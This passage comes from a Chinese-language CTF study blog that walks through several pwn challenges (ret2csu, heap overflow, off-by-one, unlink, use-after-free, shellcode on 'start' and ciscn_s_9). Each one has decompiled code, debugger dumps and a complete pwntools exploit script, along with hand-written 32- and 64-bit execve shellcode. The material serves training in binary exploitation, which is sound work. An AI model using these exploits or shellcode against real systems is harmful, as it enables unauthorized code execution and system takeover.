  vul(0LL, 0LL, 0LL);
  read(0, buf, 0x100uLL);
  return 0;
}
```

没太多好讲的就是基本的模板题目，主要的是如果不用onegadget的话

拼接system的记得在/bin/sh后面加上ret进行栈对齐。栈对齐一直很玄学对我来说噗嗤。

exp

```python
from pwn import *

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

sh = process("easycsu")

context.log_level = "DEBUG"

gadget1 = 0x00000000004011FE

gadget2 = 0x00000000004011E8

put_addr = 0x0000000000404018

libc_addr = 0x0000000000403ff0

start_addr = 0x0000000000401050

payload = (0x20 + 8) * 'a'

payload += p64(gadget1)

payload += 'a' * 8

payload += p64(0)

payload += p64(1)

payload += p64(put_addr)

payload += p64(0x0000000000404018) + p64(0x0000000000404018) + p64(0x0000000000404018)

payload += p64(gadget2)

payload += 'a' * 56

payload += p64(start_addr)

sh.recv()



sh.send(payload)

real_addr = u64(sh.recv(6).ljust(8,'\x00'))


print hex(real_addr)

addr_base = real_addr - libc.sym['puts']

print(hex(libc.sym['puts']))

system_addr = addr_base + libc.sym['system']

binsh_addr = addr_base + 0x1b3e1a

one=0x4f3d5+addr_base

pop_addr = 0x000000000040120b

sh.recv()

#payload = (0x20 + 8) * 'a' + p64(pop_addr) + p64(binsh_addr) + p64(0x0000000000401016)+p64(system_addr)

payload=(0x20 + 8) * 'a' +p64(one)
sh.send(payload)
sh.sendline('cat flag')
sh.interactive()


```

### 总结

做了2道栈迁移2道csu的题目后，真的差不多可以自由布局栈帧了很舒服。

这里总结下我的一点点经验。嗷呜！！（学的很折磨学会很开心）

第一

常用的模板攻击大小是0xb0，如果可输入大小不满足需要自行

拼接构造，例如上面的第二题csu结合栈迁移的看具体情况进行修改。



第二

我们要理解我们要做的是什么

你是想调用这个函数让他执行完，还是仅仅是调用他呢

这里的区别在例题二中已经有了很明显的体现了



# 7月16日

## 1.堆溢出 hitcontraining_magicheap

菜单题，没有输出，但是输入4869并且magic大小满足大于4869就可以触发后门

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```

经过排查，漏洞在于edit函数

edit

对于输入的内容大小没有做检测是否大于chunk本身大小，由此形成了堆溢出漏洞，我们便可以对chunk中的fd bk chunk_size以及prve_size进行控制

```c
int edit_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  __int64 v3; // [rsp+8h] [rbp-8h]

  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( !heaparray[v1] )
    return puts("No such heap !");
  printf("Size of Heap : ");
  read(0, buf, 8uLL);
  v3 = atoi(buf);
  printf("Content of heap : ");
  read_input(heaparray[v1], v3);
  return puts("Done !");
}
```

我们在此处的目的非常简单，控制magic变量大小大于4869即可

我们构造unsortedbin区块利用溢出修改其bk指针之后进行脱链操作即可达成目的

```python
add(0x30,'woainio')
add(0x80,'ixixix')
add(0x10,'aihhhh')
dele(1)
```

让chunk1进入unsortedbin ，之后对0进行edit，让其溢出后覆盖修改chunk1的bk指针，再把chunk1malloc回来就会形成脱链

```c
unsorted_chunks(av)->bk = bck = victim->bk = magic - 0x10;
bck->fd  = *(magic - 0x10 + 0x10) = unsorted_chunks(av);

```

exp

```python
from pwn import*
context.log_level='debug'
r=process('./magicheap')
#r=remote('node4.buuoj.cn','29824')
def add(size,content):
	r.sendlineafter('Your choice :','1')
	r.sendlineafter('Size of Heap : ',str(size))
	r.sendlineafter('Content of heap:',content)

def edit(idx,size,content):
	r.sendlineafter('Your choice :','2')
	r.sendlineafter('Index :',str(idx))
	r.sendafter('Size of Heap : ',str(size))
	r.sendafter('Content of heap : ',content)

def dele(idx):
	r.sendlineafter('Your choice :','3')
	r.sendlineafter('Index :',str(idx))


magic=0x006020A0
add(0x30,'1233')
add(0x80,'12313')
add(0x10,'123')
dele(1)
payload='a'*0x30+p64(0)+p64(0x91)+p64(magic-0x10)+p64(magic-0x10)
edit(0,0x50,payload)
gdb.attach(r)
add(0x80,'1')
r.sendlineafter(':','4869')
r.interactive()
```



## 2.off-by-one  hitcontraining_heapcreator

很好的一个菜单题来学习off by one

main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    menu();
    read(0, buf, 4uLL);
    switch ( atoi(buf) )
    {
      case 1:
        create_heap();
        break;
      case 2:
        edit_heap();
        break;
      case 3:
        show_heap();
        break;
      case 4:
        delete_heap();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid Choice");
        break;
    }
  }
}
```

排查后漏洞在edit函数

edit

read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL)在这可以比chunk大小多输入一个字节造成

off by one 漏洞

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Content of heap : ");
    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);//off by one
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

既然有输出功能我们不妨从泄露libc的思路上下手，那么回归本质就是构造unsortedbin区块

我们这里有off by one 可以构造一个fake chunk 当我们释放掉fake chunk 再申请回来时往里面写入某个函数的got表

再去show出来的时候got就会自动寻址到real_addr然后打印出来。

```python
alloc(0x18,'bbbb')
alloc(0x10,'aaaa')
#gdb.attach(p)
pause()
elf = ELF('./heapcreator')
libc = ELF('./libc-2.23.so')
edit(0,'/bin/sh\x00'+'b'*0x10 +'\x41')#fake chunk
pause()
dele(1)#unsortedbin
pause()
alloc(0x30,p64(0)*4+p64(0x30)+p64(elf.got['free']))#for leak libc
gdb.attach(p)
```



```c
pwndbg> x/32gx 0x90f000
0x90f000:	0x0000000000000000	0x0000000000000021
0x90f010:	0x0000000000000018	0x000000000090f030
0x90f020:	0x0000000000000000	0x0000000000000021
0x90f030:	0x0068732f6e69622f	0x6262626262626262
0x90f040:	0x6262626262626262	0x0000000000000041
0x90f050:	0x0000000000000000	0x0000000000000000
0x90f060:	0x0000000000000000	0x0000000000000000
0x90f070:	0x0000000000000030	0x0000000000602018 //free的got地址

```

我们有了libc_base之后就可以算出system的真实地址等下直接edit chunk1往里面写入system的地址就ok了

我们看看内存吧(#^.^#)‘

这是更改前的存入chunk1中的free的got表

0x602018:	0x00007fa439c5a540	0x00000000004006a6

这里不难看出0x00007fa439c5a540	这个地址就是free的real_addr

```c
pwndbg> x/32gx 0x0602018
0x602018:	0x00007fa439c5a540	0x00000000004006a6
0x602028:	0x00007fa439c456a0	0x00000000004006c6
0x602038:	0x00007fa439c2b810	0x00007fa439ccd350
0x602048:	0x00007fa439bf6750	0x00007fa439c5a180
0x602058:	0x00007fa439c45e80	0x00007fa439c0ce90
0x602068:	0x0000000000400736	0x0000000000000000
0x602078:	0x0000000000000000	0x00007fa439f9b620

```

这里是修改过后的，我们直接把free的got表改成了system的真实地址

下次当我们执行free的时候相当于执行system，而且我们在chunk0布局了/bin/sh

当我们释放chunk0相当于就去执行system(/bin/sh)

```c
pwndbg> x/32gx 0x602018
0x602018:	0x00007f7911e163e0	0x000000000040060a
0x602028:	0x00007f7911e406a0	0x00000000004006c6
0x602038:	0x00007f7911e26810	0x00007f7911ec8350
0x602048:	0x00007f7911df1750	0x00007f7911e55180
0x602058:	0x00007f7911e40e80	0x00007f7911e07e90
0x602068:	0x0000000000400736	0x0000000000000000
0x602078:	0x0000000000000000	0x00007f7912196620
0x602088:	0x0000000000000000	0x00007f79121958e0

```

exp

```python
from pwn import *
#p = remote('node4.buuoj.cn',28682)
p = process('./heapcreator')
context.log_level = 'debug'

def alloc(size,content):
	p.sendlineafter('Your choice :',str(1))
	p.sendlineafter('Size of Heap : ',str(size))
	p.sendlineafter('Content of heap:',content)

def edit(index,content):
	p.sendlineafter('Your choice :',str(2))
	p.sendlineafter('Index :',str(index))
	p.sendlineafter('Content of heap : ',content)

def show(index):
	p.sendlineafter('Your choice :',str(3))
	p.sendlineafter('Index :',str(index))

def dele(index):
	p.sendlineafter('Your choice :',str(4))
	p.sendlineafter('Index :',str(index))

alloc(0x18,'bbbb')
alloc(0x10,'aaaa')
#gdb.attach(p)
pause()
elf = ELF('./heapcreator')
libc = ELF('./libc-2.23.so')
edit(0,'/bin/sh\x00'+'b'*0x10 +'\x41')
pause()
dele(1)
pause()
alloc(0x30,p64(0)*4+p64(0x30)+p64(elf.got['free']))

show(1)
free = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success('free==>'+str(hex(free)))
libc_base = free - libc.sym['free']
system = libc_base + libc.sym['system']
log.success('system==>'+str(hex(system)))
gdb.attach(p)
edit(1,p64(system))

dele(0)
#gdb.attach(p)
p.interactive()



```



## 3.栈利用(暂未分类)pwnable_start

程序只有start和exit不能反汇编我们直接看吧

值得注意的是汇编中的注释，.text:08048087                 mov     ecx, esp        ; addr

这里是存放esp的地址

下面还有个系统调用read

.text:08048095                 mov     al, 3

```
48060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch ; '<'
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
.text:0804809C _start          endp ; sp-analysis failed
```

我们可以试下他的栈的ebp在哪里如下过程

```c
cyclic xxx
随机生成xxx大小字符串
填爆栈帧
然后用cyclic -l 加上被填爆栈帧的地址可以得到偏移（距离bp寄存器的offset）

example

───────────────────────────────────[ DISASM ]───────────────────────────────────
Invalid address 0x61616166


pwndbg> cyclic -l 0x61616166
20


```

发现是20，这题checksec后发现保护全关，我们直接泄露esp的地址然后控制esp指向丢入个shellcode就行了



# 32位手撸shellcode

```python
context.arch='i386'
code='''
push 0x68
push 0x732f2f2f
push 0x6e69622f 
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb  
int 0x80
'''
sc = asm(code)
```

# 64位手撸shellcode

```python
context.arch = 'amd64'
code = '''
mov rax, 0x68732f6e69622f;
push rax
mov rdi, rsp;
mov rsi, 0;
xor rdx, rdx;
mov rax, 59;
syscall
'''
sc = asm(code)
```



exp

```python
from pwn import *
loacl_elf = ELF("./start")
context.arch = loacl_elf.arch
p = process("./start")
p = remote("node4.buuoj.cn",27011)
#gdb.attach(p, 'b* 0x08048060')
 
#shellcode=asm(shellcraft.sh())
context.arch='i386'
code='''
push 0x68
push 0x732f2f2f
push 0x6e69622f 
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb  
int 0x80
'''
sc = asm(code)

#payload = 'a'*20  
payload = 'a'*20  + p32(0x08048087)#汇编中的addr 溢出后传入该地址去泄露esp
 
p.recvuntil("Let's start the CTF:")
p.send(payload)
esp_addr = u32(p.recv(4))
p.recv()
payload= 'a' * 20 + p32(esp_addr + 20) + sc
p.send(payload)
 
 
p.interactive()
```



# 7月18日

## 1.hitcon2014_stkof（unlink&&堆溢出）

main

菜单1-3常规无输出

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  int v5; // [rsp+Ch] [rbp-74h]
  char nptr[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  while ( fgets(nptr, 10, stdin) )
  {
    v3 = atoi(nptr);
    if ( v3 == 2 )
    {
      v5 = edit();
      goto LABEL_14;
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        v5 = dele();
        goto LABEL_14;
      }
      if ( v3 == 4 )
      {
        v5 = useless();
        goto LABEL_14;
      }
    }
    else if ( v3 == 1 )
    {
      v5 = add();
      goto LABEL_14;
    }
    v5 = -1;
LABEL_14:
    if ( v5 )
      puts("FAIL");
    else
      puts("OK");
    fflush(stdout);
  }
  return 0LL;
}
```

漏洞在edit函数（堆溢出）

没有对输入大小做检测

```c
__int64 edit()
{
  __int64 result; // rax
  int i; // eax
  unsigned int v2; // [rsp+8h] [rbp-88h]
  __int64 n; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  v2 = atol(s);
  if ( v2 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[v2] )
    return 0xFFFFFFFFLL;
  fgets(s, 16, stdin);
  n = atoll(s);
  ptr = (&::s)[v2];
  for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
  {
    ptr += i;
    n -= i;
  }
  if ( n )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
```

## 利用思路[¶]()（UNLINK）

### 条件[¶]()

1. UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
2. 已知位置存在一个指针指向可进行 UAF 的 chunk

### 效果[¶]()

使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18

### 思路[¶]()

设指向可 UAF chunk 的指针的地址为 ptr

1. 修改 fd 为 ptr - 0x18
2. 修改 bk 为 ptr - 0x10
3. 触发 unlink

ptr 处的指针会变为 ptr - 0x18。



## 本题思路概述

先利用堆溢出伪造chunk用于形成unlink #2 #3

接着更改free的got表为puts的got表 #2

再将用于修改got表的chunk的上一个chunk写入puts的plt表

这样当我们去释放用于修改got表的chunk的时候

就会去执行puts函数里面的参数就是puts的got表，就可以得到libc。

有libc我们可以直接写入system('/bin/sh')。



### 第一步 unlink

本题中的ptr是对应要修改chunk的指针地址

从ida中我们可以得知他的chunk是存放在bss段的一个全局数组里面的

我们要修改chunk2就要做到chunk2相对于数组首地址的偏移

我们先上个调试

我创建3个堆，首地址存放了chunk的数量

然后chunk1在0x602140

chunk2在0x602150 chunk3在0x602158

```c
pwndbg> x/32gx 0x602100
0x602100:	0x0000000000000003	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
0x602140:	0x0000000000000000	0x0000000000e05420
0x602150:	0x0000000000e05870	0x0000000000e058c0

```

根据利用规则

fd=ptr-0x18

bk=ptr-0x10

这样就可以绕过unlink的检测

```python
add(0x20)#1
add(0x30)#2
add(0x80)#3
add(0x30)#4
```

我们先构造fake chunk 用于绕过unlink的非法检测

注意哦，chunk3大小必须大于fastbin的大小不然是不会进入unsortedbin

然后这里是Ubuntu16的系统不需要考虑tcache。

```python
p1=p64(0)#prev_size
p1+=p64(0x30)#fake chunk_size
p1+=p64(fd)+p64(bk)
p1+='a'*0x10#junk code
p1+=p64(0x30)#prev_size
p1+=p64(0x90)'''fake chunk_size insure位置为0欺骗程序让程序误认为前面的chunk被释放了'''
edit(2,p1)
free(3)#unlink
```

unlink后的效果，很明显的可以看见chunk2和fake chunk有重叠的部分

fake chunk是c1 他的fd bk指针在9470这里开始

我们等下就可以往这里写入got表。

```c
pwndbg> x/32gx 0x14a9450
0x14a9450:	0x0000000000000000	0x0000000000000041
0x14a9460:	0x0000000000000000	0x00000000000000c1
0x14a9470:	0x00007f1ac4923b78	0x00007f1ac4923b78
0x14a9480:	0x6161616161616161	0x6161616161616161
0x14a9490:	0x0000000000000030	0x0000000000000090
0x14a94a0:	0x0000000000000000	0x0000000000000000
0x14a94b0:	0x0000000000000000	0x0000000000000000
0x14a94c0:	0x0000000000000000	0x0000000000000000
0x14a94d0:	0x0000000000000000	0x0000000000000000
0x14a94e0:	0x0000000000000000	0x0000000000000000
0x14a94f0:	0x0000000000000000	0x0000000000000000

```

### 第二步 泄露libc

从上面的代码块可以看出fake chunk我们应该怎么去填充构造更改got表

```python
p2 = 'b'*0x10 + p64(free_got)+p64(puts_got)
edit(2,p2)
p3=p64(puts_plt)
edit(1,p3)
free(2)
leak = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.success('leak:'+hex(leak))
base=leak-0x06f6a0
sys=base+0x0453a0
binsh=base+0x18ce17
```

### 第三步 getshell

```python
edit(1,p64(sys))
edit(4,'/bin/sh\x00')
free(4)
r.interactive()
```



### tips:

值得一提的是

当我们有2个相邻的chunk

（这里的相邻指得是这样的，例如有chunk 1 2 3 4 ，当2 3 被free了那么1 4就相邻了）

如果我1中的fd指针指向某个函数的地址

然后与其相邻的chunk里面的fd bk就是作为参数的

参数位数不够的可以向该chunk后面的内容区块拿来利用

然后释放相邻chunk就会执行函数

说人话就是

1号chunk就是函数的调用chunk，与之相邻的chunk是参数chunk

释放参数chunk就可以执行函数。

例如1号存放system的真实地址

4号存放'/bin/sh\x00'

free(4)

就可以执行system('/bin/sh')

### exp:

```python
from pwn import *
r=process('./stkof')
libc=ELF('./libc-2.23.so')
elf=ELF('stkof')
context.log_level='debug'
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
#r=remote('node4.buuoj.cn','29385')
def debug(cmd=''):
     gdb.attach(r,cmd)


def add(size):
    r.sendline("1")
    r.sendline(str(size))
    r.recvuntil("OK\n")
 
def free(idx):
    r.sendline("3")
    r.sendline(str(idx))
 
def edit(idx,strings):
    r.sendline("2")
    r.sendline(str(idx))
    r.sendline(str(len(strings)))
    r.send(strings)
    r.recvuntil("OK\n")
target = 0x602140 + 0x10 #global[2]
fd = target - 24
bk = target - 16

add(0x20)#1
add(0x30)#2
add(0x80)#3
add(0x30)#4
p1=p64(0)#prev_size
p1+=p64(0x30)#fake chunk_size
p1+=p64(fd)+p64(bk)
p1+='a'*0x10#junk code
p1+=p64(0x30)#prev_size
p1+=p64(0x90)#fake chunk_size

edit(2,p1)
free(3)#unlink
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
#atoi_got = elf.got['atoi']
p2 = 'b'*0x10 + p64(free_got)+p64(puts_got)
edit(2, p2) #target-0x8

p3 = p64(puts_plt)
edit(1, p3) #global[1]
free(2)     #chu fa

leak = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.success('leak:'+hex(leak))
base=leak-0x06f6a0
sys=base+0x0453a0
binsh=base+0x18ce17

edit(1,p64(sys))
edit(4,'/bin/sh\x00')
free(4)
r.interactive()
```

## 2.hitcontraining_bamboobox(堆溢出+unlink)

QWQ和上面一样啦

不过这个给了show函数咋们就不用构造put了

直接用show打印就可以泄露libc 啦

不过这里我们需要注意一点，也是刚才没注意到的

```python
payload = p64(0) * 2
payload += p64(0x40) + p64(free_got)
edit(0,len(payload),payload)
```

unlink后形成的chunk我们再去写入的话不是写到chunk上了

是写到堆存放的数组上去啦，如下代码块所示，0x602018就是free的got表地址0x40是chunk0的大小

我们要填充 payload = p64(0) * 2的原因是因为

此时ptr=ptr-0x18

我们不难看出要想骗过程序检测还要修改chunk的大小标识

所以补上0x10 就是ptr-0x8 ptr就是0x6020c8（具体是为什么我在第一题unlink中有提到）

所以ptr-0x8就是数组首地址可以让我们去控制他的大小标识 ，绕过检测完美哦

其他的话就没什么好说的了。

```
pwndbg> x/32gx 0x6020C0
0x6020c0 <itemlist>:	0x0000000000000040	0x0000000000602018
0x6020d0 <itemlist+16>:	0x0000000000000000	0x0000000000000000
0x6020e0 <itemlist+32>:	0x0000000000000080	0x00000000006f3110
0x6020f0 <itemlist+48>:	0x0000000000000020	0x00000000006f31a0
0x602100 <itemlist+64>:	0x0000000000000000	0x0000000000000000

```



```python
from pwn import *
r=process('./bamboobox')
#r=remote('node4.buuoj.cn','27243')
from LibcSearcher import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'
elf=ELF('./bamboobox')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']

def add(length,context):
	r.sendlineafter('Your choice:',str(2))
	r.sendlineafter('Please enter the length of item name:',str(length))
	r.sendafter('Please enter the name of item:',str(context))

def dele(idx):
	r.sendlineafter('Your choice:',str(4))
	r.sendlineafter('Please enter the index of item:',str(idx))

def edit(idx,length,context):
	r.sendlineafter('Your choice:',str(3))
	r.sendlineafter('Please enter the index of item:',str(idx))
	r.sendlineafter('Please enter the length of item name:',str(length))
	r.sendafter('Please enter the new name of the item:',str(context))
def show():
    r.recvuntil("Your choice:")
    r.sendline(str(1))

fd=0x6020c8-0x18
bk=0x6020c8-0x10
add(0x40,'a')#0
add(0x80,'a')#1
add(0x80,'a')#2
add(0x20,'/bin/sh\x00')#3
payload=p64(0)+p64(0x41)+p64(fd)+p64(bk)+'a'*0x20+p64(0x40)+p64(0x90)
edit(0,len(payload),payload)
dele(1)
payload = p64(0) * 2
payload += p64(0x40) + p64(free_got)
edit(0,len(payload),payload)
gdb.attach(r)
show()
leak = u64(r.recvuntil("\x7f")[-6:]+'\x00\x00')
log.success(hex(leak))

libc=LibcSearcher('free',leak)
base=leak-libc.dump('free')
sys=base+libc.dump('system')

edit(0,len(p64(sys)),p64(sys))
dele(3)
r.interactive()
```

## 3.UAF hacknote

函数我就懒得放上来了漏洞在free的时候没有置零然后没有edit功能

使用uaf漏洞就行了



简略分析下吧

这个chunk的结构体由2部分组成

我们new 一个chunk会有2个chunk生成

一个固定的0x11大小的存放了puts调用的地址和用户创建的chunk的内容的地址

泄露地址老生常谈咯，构造unsortedbin然后申请回来一部分空间去写入payload

```
pwndbg> x/16wx 0x804b070
0x804b070:	0x00000000	0x00000011	0x0804862b	0x0804b088
0x804b080:	0x00000000	0x00000049	0x000a3636	0x00000000
0x804b090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0a0:	0x00000000	0x00000000	0x00000000	0x00000000

```

对于payload = p32(0x804862b)+p32(puts_got)

这句代码，我们要知道的是上面我也提到了他会固定生成一个0x11大小的chunk放2个指针

我们把chunk1 2 free了进入了bin中，当我们再次申请的chunk小于bin的时候chunk就会从bin中把原来的空间拿出来复用

因为他没有置0嘛，所以原来的指针就不变咯。我们申请一个比0x11小的能刚好写下payload的chunk 大小为8

前面的puts的地址不用动，动了会崩溃，后面把原来指向堆内容的chunk改为某个函数的got表

下面当我们去打印这个堆的时候他就会去打印这个函数的real_addr

至此我们的libc泄露完成

这个还有地方说下，偏移的计算打破了我常规认知

就是比如我泄露的是puts的地址

然后我要的是system

那我就拿泄露的地址减去泄露的那个函数在libc的地址再加上我要的函数在libc中的地址

就可以得到我们要的函数的real_addr.

```python
add(20,'aaaa'*2)
add(20,'bbbb'*2)
dele(0)
dele(1)
payload = p32(0x804862b)+p32(puts_got)
add(8,payload)
#gdb.attach(r)

show(0)
leak = u32(r.recv(4))
log.success('leak:'+hex(leak))
sys=leak-libc.sym['puts']+libc.sym['system']
```

getshell

这里dele1是为了让0x11的空间再次进入bin为了我们写入system做准备

这里实际上用到了double free没有报错是因为我们上面已经将其指针修改为了某个存在的函数（上面我们改的是puts的got）

而不是他原来的chunk的内容的地址所以是有效的指针不会报错啦。

```python
dele(1)
#gdb.attach(r)

payload = p32(sys) + ';sh\0'
add(8,payload)
show(0)
r.interactive()
```

exp:

```python
from pwn import *
r=process('./hacknote1')
elf=ELF('./hacknote1')
libc=ELF('./libc-2.23-32.so')
context.log_level='debug'
r=remote('node4.buuoj.cn','26104')
puts_got=0x804A024
def add(size,content):
	r.sendlineafter('Your choice :',str(1))
	r.sendlineafter('Note size :',str(size))
	r.sendlineafter('Content :',str(content))

def dele(idx):
	r.sendlineafter('Your choice :',str(2))
	r.sendlineafter('Index :',str(idx))

def show(idx):
	r.sendlineafter('Your choice :',str(3))
	r.sendlineafter('Index :',str(idx))

add(20,'aaaa'*2)
add(20,'bbbb'*2)
dele(0)
dele(1)
payload = p32(0x804862b)+p32(puts_got)
add(8,payload)
#gdb.attach(r)

show(0)
leak = u32(r.recv(4))
log.success('leak:'+hex(leak))

sys=leak-libc.sym['puts']+libc.sym['system']
#ys=base+libc.sym['system']
dele(1)
#gdb.attach(r)

payload = p32(sys) + ';sh\0'
add(8,payload)
show(0)
r.interactive()
```

## 7月19日

## 1.ciscn_s_9

32位手撸shellcode

```python
context.arch='i386'
code='''
push 0x68
push 0x732f2f2f
push 0x6e69622f 
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb  
int 0x80
'''
sc = asm(code)
```

64位手撸shellcode

```python
context.arch = 'amd64'
code = '''
mov rax, 0x68732f6e69622f;
push rax
mov rdi, rsp;
mov rsi, 0;
xor rdx, rdx;
mov rax, 59;
syscall
'''
sc = asm(code)
```



```python
# coding=utf-8
from pwn import *

p = process("./ciscn_s_9")
p=remote('node4.buuoj.cn','26416')
ret_addr = 0x08048554 #jmp esp
context.arch='i386'
code='''
push 0x68
push 0x732f2f2f
push 0x6e69622f 
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb  
int 0x80
'''
shellcode = asm(code)
payload = shellcode.ljust(0x24,'a') + p32(ret_addr) + asm("sub esp,40;call esp")
print(len(payload))

#gdb.attach(p)
p.sendline(payload)
p.interactive()
```

## 2.npuctf_2020_easyheap(off-by-one)

常规菜单，功能齐全，就是限制了输入chunk的大小为24和56，小问题，漏洞在edit可以多输入一个字节

edit

```c
unsigned __int64 edit()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf("Content: ");
    read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);
    puts("Done!");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

### chunk结构分析

我申请了一个大小为24和一个大小为56的chunk

然后除了本身的内容chunk，还有数组chunk会一起生成

数组chunk固定大小为0x21存放着其指向的chunk的size和指向chunk的地址

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x603250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x603270
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x603290
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x6032b0
Size: 0x41

Top chunk | PREV_INUSE
Addr: 0x6032f0
Size: 0x20d11

```

数组chunk如下代码块模样

大小为0x18 地址指向chunk0

```c
pwndbg> x/32gx0x603250
0x603250:	0x0000000000000000	0x0000000000000021
0x603260:	0x0000000000000018	0x0000000000603280

```

分析完毕，开始分析利用过程



### 利用思路概述

大致方向就是off by one 修改chunk大小形成堆重叠从而对重叠部分进行任意写入，控制其指针指向泄露libc以及执行函数

### 具体利用

对于这道题

我们先构造3个chunk

```
add(0x18,'ni')#0
add(0x18,'wo')#1
add(0x18,'/bin/sh\x00')#2
```

0 1构造堆重叠

因为我们的chunk绑定结构是这样的

我们溢出的那个字节实际上修改的是数组管理chunk的chunk_size

```
---------------
|数组管理chunk |      
|             |
|-------------|
---------------
| 内容chunk    |
|              |
|--------------|
```

我们这样构造fake chunk的payload

```python
payload='\x00'*24+'\x41'
edit(0,payload)
```

为什么是41？ 因为我们输入56的时候实际生成他的chunk_size记录的是0x41，我们为了方便利用，能在后续利用将bin中区块完整申请回来就构造一样的chunk方便布局



接下来我们去康康吧，里面怎么样了

显然已经生成了一个0x41的chunk啦

```c
pwndbg> heap
